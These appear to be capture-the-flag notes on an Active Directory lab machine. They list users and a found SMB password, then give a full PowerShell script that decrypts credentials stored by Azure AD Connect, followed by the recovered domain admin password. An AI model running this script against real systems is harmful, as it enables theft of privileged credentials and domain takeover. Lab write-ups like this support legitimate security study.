**users  **
Guest
MONTEVERDE$
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
<img width="1382" height="235" alt="image" src="https://github.com/user-attachments/assets/10a682ee-90a1-410c-88b2-29fc1adbe7e8" />

SABatchJobs : SABatchJobs smb user
<img width="1069" height="97" alt="image" src="https://github.com/user-attachments/assets/da66c954-ed09-482e-b618-122d871e8e12" />

smb users folder  password    mhope:4n0therD4y@n0th3r$
<img width="807" height="293" alt="image" src="https://github.com/user-attachments/assets/191dd76c-a2d0-4558-9567-b13d33c9b7d8" />
<img width="1547" height="98" alt="image" src="https://github.com/user-attachments/assets/3a9688b9-28b2-4b27-92e4-0cee9211dab7" />  

mhope is in azureadmins grouup  
https://blog.xpnsec.com/azuread-connect-for-redteam/  
the blog code didnt work... i found someone elses walkthrough  
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)

<img width="412" height="114" alt="image" src="https://github.com/user-attachments/assets/640bb80b-c976-4238-b272-8f644cdb5e0d" />
d0m@in4dminyeah!  
<img width="654" height="193" alt="image" src="https://github.com/user-attachments/assets/a463000f-6553-4e22-bd5b-4c87a55e68f5" />
